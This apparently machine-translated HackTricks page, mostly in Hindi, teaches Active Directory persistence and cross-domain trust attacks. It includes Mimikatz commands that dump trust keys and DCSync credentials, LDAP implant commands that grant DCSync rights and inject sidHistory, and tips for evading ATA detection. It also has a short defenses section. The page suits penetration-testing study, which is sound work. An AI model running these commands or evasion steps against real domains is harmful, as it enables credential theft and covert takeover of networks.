**Security descriptors** किसी object के ऊपर मौजूद **permissions** को **store** करने के लिए उपयोग होते हैं। यदि आप किसी object की security descriptor में एक छोटा सा परिवर्तन कर लें, तो आप बिना किसी privileged group के सदस्य बने भी उस object पर बहुत उपयोगी privileges प्राप्त कर सकते हैं।

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

LSASS को memory में बदलकर एक **universal password** स्थापित करें, जो सभी domain accounts तक पहुँच की अनुमति देता है।

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप अपनी **own SSP** बना सकते हैं ताकि machine तक पहुँचने के लिए उपयोग किए जाने वाले **credentials** को **clear text** में capture किया जा सके।

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **नया Domain Controller** register करता है और इसे उपयोग करके निर्दिष्ट objects पर attributes (SIDHistory, SPNs...) **push** करता है, वह भी बिना उन **modifications** के बारे में logs छोड़े। इसके लिए आपको DA privileges और root domain के अंदर होना आवश्यक है।\
ध्यान दें कि यदि आप गलत डेटा उपयोग करते हैं तो काफ़ी गैर-रुचिकर logs दिख सकती हैं।

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने बताया कि यदि आपके पास **LAPS passwords पढ़ने** की पर्याप्त permission है तो आप privileges escalate कर सकते हैं। हालाँकि, इन पासवर्ड्स का उपयोग **persistence बनाए रखने** के लिए भी किया जा सकता है।\
देखें:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary मानता है। इसका मतलब यह है कि **एक single domain compromise होने पर पूरा Forest compromise होने की संभावना हो सकती है**।

### Basic Information

एक [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है जो एक domain के user को दूसरे domain के resources तक पहुँचने की अनुमति देता है। यह मूल रूप से दोनों domains के authentication systems के बीच एक linkage बनाता है, जिससे authentication verifications seamless रूप से प्रवाहित हो सके। जब domains एक trust स्थापित करते हैं, तो वे अपनी Domain Controllers (DCs) के भीतर कुछ विशिष्ट **keys** का आदान-प्रदान और भंडारण करते हैं, जो trust की integrity के लिए महत्वपूर्ण होते हैं।

एक सामान्य परिदृश्य में, यदि कोई user किसी **trusted domain** में किसी service तक पहुँचने की कोशिश करता है, तो उसे पहले अपने domain के DC से एक विशेष टिकट जिसे **inter-realm TGT** कहा जाता है, request करना होगा। यह TGT उस साझा **key** के साथ encrypt किया जाता है जिसे दोनों domains ने सहमति से रखा होता है। उसके बाद user यह inter-realm TGT **trusted domain के DC** को प्रस्तुत करता है ताकि एक service ticket (**TGS**) प्राप्त किया जा सके। यदि trusted domain का DC inter-realm TGT को सफलतापूर्वक validate कर देता है, तो वह TGS जारी करता है और user को service तक पहुँच मिल जाती है।

**Steps**:

1. एक **client computer** Domain 1 में अपना **NTLM hash** उपयोग करके अपने **Domain Controller (DC1)** से **Ticket Granting Ticket (TGT)** request करना शुरू करता है।
2. यदि client सफलतापूर्वक authenticate हो जाता है तो DC1 नया TGT जारी करता है।
3. फिर client को Domain 2 के resources तक पहुँचने के लिए DC1 से एक **inter-realm TGT** request करनी होती है।
4. inter-realm TGT उस **trust key** के साथ encrypt होता है जो DC1 और DC2 के बीच shared होती है और जो two-way domain trust का हिस्सा है।
5. client फिर inter-realm TGT को **Domain 2 के Domain Controller (DC2)** के पास ले जाता है।
6. DC2 अपने shared trust key का उपयोग करके inter-realm TGT को verify करता है और यदि वैध पाया जाए तो वह client के लिए Domain 2 के उस server के लिए **Ticket Granting Service (TGS)** जारी करता है जिसे client access करना चाहता है।
7. अंततः client यह TGS उस server को प्रस्तुत करता है, जो server के account hash के साथ encrypt होता है, और इससे Domain 2 में service तक पहुँच मिलती है।

### Different trusts

यह महत्वपूर्ण है कि **trust एक-way या two-way हो सकता है**। two-way विकल्प में दोनों domains एक-दूसरे पर trust करते हैं, पर **one-way** trust relation में एक domain **trusted** होता है और दूसरा **trusting** होता है। ऐसे मामलों में, **trusted domain से आप केवल trusting domain के अंदर resources तक ही पहुँच पाएँगे**।

यदि Domain A, Domain B पर trust करता है, तो A trusting domain है और B trusted domain है। साथ ही, **Domain A** में यह एक **Outbound trust** होगा; और **Domain B** में यह एक **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह आमतौर पर उसी forest के भीतर एक सेटअप होता है, जहाँ एक child domain automatically अपने parent domain के साथ two-way transitive trust रखता है। इसका अर्थ यह है कि authentication requests parent और child के बीच सहजता से प्रवाहित हो सकती हैं।
- **Cross-link Trusts**: जिन्हें "shortcut trusts" भी कहा जाता है, ये child domains के बीच बनाए जाते हैं ताकि referral प्रक्रियाओं को तेज किया जा सके। जटिल forests में, authentication referrals आमतौर पर forest root तक ऊपर और फिर target domain तक नीचे यात्रा करते हैं। cross-links बनाने से यह यात्रा छोटा हो जाती है, जो भौगोलिक रूप से फैले वातावरण में विशेष रूप से उपयोगी है।
- **External Trusts**: ये अलग, unrelated domains के बीच स्थापित किए जाते हैं और स्वभाव से non-transitive होते हैं। Microsoft की documentation के अनुसार, external trusts उन domains के resources तक पहुँचने के लिए उपयोगी हैं जो current forest से बाहर हों और जिनका forest trust से कनेक्शन न हो। external trusts के साथ SID filtering के जरिए security बढ़ाई जाती है।
- **Tree-root Trusts**: ये trusts forest root domain और newly added tree root के बीच स्वचालित रूप से स्थापित होते हैं। हालांकि आम तौर पर अक्सर नहीं मिलते, tree-root trusts नए domain trees को forest में जोड़ने के लिए महत्वपूर्ण होते हैं, जिससे वे एक unique domain name रख सकें और two-way transitivity बनाए रख सकें।
- **Forest Trusts**: यह trust दो forest root domains के बीच एक two-way transitive trust होता है, जो security measures बढ़ाने के लिए SID filtering भी लागू करता है।
- **MIT Trusts**: ये trusts non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित किए जाते हैं। MIT trusts अधिक specialized होते हैं और उन environments के लिए होते हैं जिन्हें Windows पारिस्थितिकी तंत्र के बाहर Kerberos-based systems के साथ integration की आवश्यकता होती है।

#### Other differences in **trusting relationships**

- एक trust relationship **transitive** (A trusts B, B trusts C, तो A trusts C) या **non-transitive** भी हो सकती है।
- एक trust relationship **bidirectional trust** (दोनों एक-दूसरे पर trust करते हैं) या **one-way trust** (केवल एक ही दूसरे पर trust करता है) के रूप में सेट की जा सकती है।

### Attack Path

1. **Enumerate** करें trusting relationships को
2. जाँचें कि क्या कोई **security principal** (user/group/computer) के पास **दूसरे domain** के resources तक **access** है, शायद ACE entries के माध्यम से या दूसरे domain के groups में होने से। **Across-domain relationships** देखें (trust संभवतः इसी के लिए बनाया गया था)।
1. इस मामले में kerberoast एक और विकल्प हो सकता है।
3. उन **accounts को compromise** करें जो domains के बीच **pivot** कर सकते हैं।

Attackers के पास दूसरे domain के resources तक पहुँचने के तीन प्राथमिक mechanisms हो सकते हैं:

- **Local Group Membership**: Principals को machines पर local groups में जोड़ा जा सकता है, जैसे किसी server के “Administrators” group में, जिससे उन्हें उस मशीन पर काफी नियंत्रण मिल जाता है।
- **Foreign Domain Group Membership**: Principals foreign domain के groups के भी सदस्य हो सकते हैं। हालांकि, इस विधि की प्रभावशीलता trust की प्रकृति और group की scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को किसी resource तक access देने के लिए **ACL** में, विशेषकर **ACEs** में निर्दिष्ट किया जा सकता है। ACLs, DACLs और ACEs की तंत्रिका समझने के लिए, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” एक अमूल्य संसाधन है।

### Find external users/groups with permissions

आप **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** की जाँच करके domain में foreign security principals पा सकते हैं। ये external domain/forest के user/group होंगे।

आप इसे **Bloodhound** या powerview का उपयोग करके जाँच सकते हैं:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent फ़ॉरेस्ट privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
डोमेन ट्रस्ट्स को enumerate करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> कुल **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरी _Parent_ --> _Child_ के लिए।\
> आप वर्तमान डोमेन द्वारा उपयोग की जा रही कुंजी को निम्न कमांड से देख सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Trust का दुरुपयोग करके SID-History injection के साथ child/parent domain में Enterprise admin के रूप में Escalate करें:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

यह समझना महत्वपूर्ण है कि Configuration Naming Context (NC) का कैसे दुरुपयोग किया जा सकता है। Configuration NC Active Directory (AD) वातावरण में पूरे forest में configuration डेटा के लिए एक केंद्रीय repository के रूप में काम करता है। यह डेटा forest के प्रत्येक Domain Controller (DC) पर replicate होता है, और writable DCs Configuration NC की writable copy रखती हैं। इसका दुरुपयोग करने के लिए आपके पास किसी DC पर **SYSTEM privileges** होना आवश्यक है, वरीयता child DC की।

**Link GPO to root DC site**

Configuration NC के Sites container में AD forest के भीतर सभी domain-joined कंप्यूटर्स के sites की जानकारी होती है। किसी भी DC पर SYSTEM privileges के साथ कार्य करके, attackers GPOs को root DC sites से link कर सकते हैं। यह क्रिया उन sites पर लागू होने वाली policies को manipulate करके root domain को संभावित रूप से compromise कर सकती है।

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

एक attack vector में domain के भीतर privileged gMSAs को target करना शामिल है। gMSAs के passwords की गणना के लिए आवश्यक KDS Root key Configuration NC में संग्रहीत होती है। किसी भी DC पर SYSTEM privileges के साथ, KDS Root key तक पहुँच कर पूरे forest में किसी भी gMSA के पासवर्ड compute करना संभव है।

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

यह तरीका धैर्य मांगता है, नए privileged AD objects के बनने का इंतज़ार करना। SYSTEM privileges के साथ, attacker AD Schema को modify करके किसी भी user को सभी classes पर complete control दे सकता है। इससे नए बने AD objects पर unauthorized access और control हो सकता है।

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability का लक्ष्य Public Key Infrastructure (PKI) objects पर नियंत्रण पाना है ताकि एक certificate template बनाया जा सके जो forest के किसी भी user के रूप में authentication सक्षम करे। चूंकि PKI objects Configuration NC में रहते हैं, एक writable child DC को compromise करने पर ESC5 attacks को execute करना संभव हो जाता है।

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
इस परिदृश्य में **your domain is trusted** एक बाहरी डोमेन द्वारा, जो आपको उसके ऊपर **undetermined permissions** प्रदान करता है। आपको पता लगाना होगा कि **which principals of your domain have which access over the external domain** और फिर इसे exploit करने का प्रयास करना होगा:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### बाहरी फॉरेस्ट डोमेन - एक-तरफा (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.

However, when a **domain is trusted** by the trusting domain, the trusted domain **creates a user** with a **predictable name** that uses as **password the trusted password**. Which means that it's possible to **access a user from the trusting domain to get inside the trusted one** to enumerate it and try to escalate more privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Another way to compromise the trusted domain is to wait in a machine where a **user from the trusted domain can access** to login via **RDP**. Then, the attacker could inject code in the RDP session process and **access the origin domain of the victim** from there.\
Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- फॉरेस्ट ट्रस्ट्स के पार SID history attribute का लाभ उठाकर होने वाले attacks के जोखिम को SID Filtering कम करता है, जो सभी inter-forest trusts पर डिफ़ॉल्ट रूप से सक्रिय होता है। यह इस धारणा पर आधारित है कि intra-forest trusts सुरक्षित हैं, क्योंकि Microsoft की नज़रों में सुरक्षा सीमा domain के बजाय forest है।
- हालांकि, एक समस्या है: SID filtering applications और user access को बाधित कर सकता है, जिसके कारण इसे कभी-कभार deactivate किया जा सकता है।

### **Selective Authentication:**

- inter-forest trusts के लिए, Selective Authentication का उपयोग यह सुनिश्चित करता है कि दोनों forests के users स्वतः authenticate न हों। इसके बजाय, users को trusting domain या forest के भीतर domains और servers तक पहुँचने के लिए explicit permissions की आवश्यकता होती है।
- ध्यान देने योग्य है कि ये उपाय writable Configuration Naming Context (NC) के शोषण या trust account पर हमलों से सुरक्षा प्रदान नहीं करते।

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ऑपरेटर को उन स्थानों पर नए principals या machine accounts स्टेज करने की अनुमति देती हैं जहाँ OU अधिकार मौजूद हैं। `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे लक्ष्यों को हाईजैक कर लेते हैं जब write-property अधिकार मिल जाते हैं।
- ACL-focused commands जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` किसी भी AD ऑब्जेक्ट पर WriteDACL/WriteOwner को पासवर्ड रिसेट्स, group membership नियंत्रण, या DCSync replication privileges में ट्रांसलेट कर देते हैं बिना PowerShell/ADSI आर्टीफैक्ट छोड़े। `remove-*` समकक्ष इन इंजेक्ट किए गए ACEs की सफाई करते हैं।

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` तुरंत किसी compromised user को Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) बिना पासवर्ड छुए उसे AS-REP roasting के लिए चिह्नित कर देता है।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को beacon से रीराइट कर देते हैं, जिससे constrained/unconstrained/RBCD attack paths सक्षम हो जाते हैं और remote PowerShell या RSAT की आवश्यकता समाप्त हो जाती है।

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` नियंत्रित principal के SID history में privileged SIDs इंजेक्ट करता है (देखें [SID-History Injection](sid-history-injection.md)), जिससे LDAP/LDAPS के माध्यम से स्टेल्थी एक्सेस इनहेरिटेंस मिलता है।
- `move-object` कंप्यूटरों या उपयोगकर्ताओं का DN/OU बदल देता है, जिससे attacker उन assets को OUs में खींच सकता है जहाँ पहले से delegated rights मौजूद हैं, और फिर `set-password`, `add-groupmember`, या `add-spn` का दुरुपयोग कर सकता है।
- सख्ती से scoped हटाने के कमांड (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, आदि) ऑपरेटर को क्रेडेंशियल या persistence हासिल करने के बाद तेज़ rollback की अनुमति देते हैं, जिससे telemetry कम होता है।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Domain Admins को केवल Domain Controllers पर लॉगिन करने की अनुमति दी जानी चाहिए, और उन्हें अन्य होस्ट्स पर उपयोग करने से बचना चाहिए।
- **Service Account Privileges**: सेवाओं को Domain Admin (DA) privileges के साथ नहीं चलाना चाहिए।
- **Temporal Privilege Limitation**: जिन कार्यों के लिए DA privileges की आवश्यकता है, उनकी अवधि सीमित करनी चाहिए। इसे इस तरह लागू किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Deception लागू करने का मतलब है traps सेट करना, जैसे decoy users या computers, जिनमें ऐसे फीचर हों जैसे passwords that do not expire या Trusted for Delegation के रूप में चिह्नित। इसमें विशिष्ट अधिकारों वाले users बनाना या उन्हें उच्च-privilege groups में जोड़ना शामिल है।
- एक व्यावहारिक उदाहरण में टूल्स का उपयोग शामिल है: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques को deploy करने के बारे में और जानकारी [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) पर मिल सकती है।

### **Identifying Deception**

- **For User Objects**: संदिग्ध संकेतों में atypical ObjectSID, दुर्लभ logons, creation dates, और कम bad password counts शामिल हैं।
- **General Indicators**: संभावित decoy objects के attributes की तुलना असली objects से करने पर विसंगतियाँ प्रकट हो सकती हैं। Tools जैसे [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) ऐसी deception पहचानने में मदद कर सकते हैं।

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration से बचना चाहिए।
- **Ticket Impersonation**: टिकट बनाने के लिए **aes** keys का उपयोग detection से बचने में मदद करता है क्योंकि इससे NTLM पर डाउनग्रेड नहीं होता।
- **DCSync Attacks**: ATA detection से बचने के लिए non-Domain Controller से निष्पादन करने की सलाह दी जाती है, क्योंकि सीधे Domain Controller से निष्पादन alerts ट्रिगर करेगा।

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)

{{#include ../../banners/hacktricks-training.md}}
